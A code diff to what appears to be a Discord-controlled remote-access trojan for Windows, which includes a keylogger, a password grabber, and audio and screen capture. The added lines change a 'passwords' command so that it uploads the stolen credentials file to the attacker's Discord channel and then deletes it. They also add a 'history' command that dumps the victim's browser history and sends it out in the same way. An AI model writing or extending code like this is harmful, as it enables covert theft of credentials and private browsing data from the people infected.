@@ -16,6 +16,7 @@ from zipfile import ZipFile
 import asyncio
 import sounddevice
 from scipy.io.wavfile import write
+from browser_history import get_history
 from threading import Thread
 import winreg
 import pyautogui
@@ -34,7 +35,6 @@ from resources.passwords_grabber import *
 ##   Everything you do, you are doing at your own risk and responsibility.   ##
 ##                                                                           ##
 ###############################################################################
-
 
 
 
@@ -455,8 +455,14 @@ async def on_message(message):
             await message.delete()
             if message.content[6:] == 'passwords':
                 grab_passwords()
-                files_to_send.append([message.channel.id, '`Grabbed passwords:`', 'credentials.txt', True])
-
+                reaction_msg = await message.channel.send('``Grabbed passwords:``', file=discord.File('credentials.txt', filename='credentials.txt')); await reaction_msg.add_reaction('📌')
+                os.system('del credentials.txt')
+            elif message.content[6:] == 'history':
+                with open('history.txt', 'w') as history:
+                    for entry in get_history().histories:
+                        history.write(entry[0].strftime('%d.%m.%Y %H:%M') + ' -> ' + entry[1] +'\n\n')
+                reaction_msg = await message.channel.send(file=discord.File('history.txt')); await reaction_msg.add_reaction('🔴')
+                os.system('del history.txt')
 
         elif expectation == 'onefile':
             split_v1 = str(message.attachments).split("filename='")[1]
@@ -512,6 +518,8 @@ def on_press(key):
             else:
                 messages_to_send.append([channel_ids['main'], text_buffor])
             text_buffor = ''
+
+
 
 with Listener(on_press=on_press) as listener:
     client.run(bot_token)
